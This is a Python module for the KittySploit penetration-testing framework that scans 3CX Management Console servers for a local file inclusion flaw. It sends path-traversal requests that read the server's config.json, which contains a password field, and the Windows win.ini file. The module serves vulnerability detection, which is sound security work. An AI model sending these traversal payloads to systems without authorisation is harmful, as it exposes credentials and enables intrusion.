#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""3CX Management Console is vulnerable to local file inclusion."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': '3CX Management Console - Local File Inclusion Detection',
        'description': '3CX Management Console is vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', '3cx', 'lfi', 'voip', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88',
        ],
    }

    def run(self):
        for path in ('/Electron/download/windows/..\\..\\..\\Http\\webroot\\config.json', '/Electron/download/windows/\\windows\\win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('CfgServerPassword', 'CfgServerAppName', 'bit app support', 'fonts', 'extensions',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="3CX Management Console - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

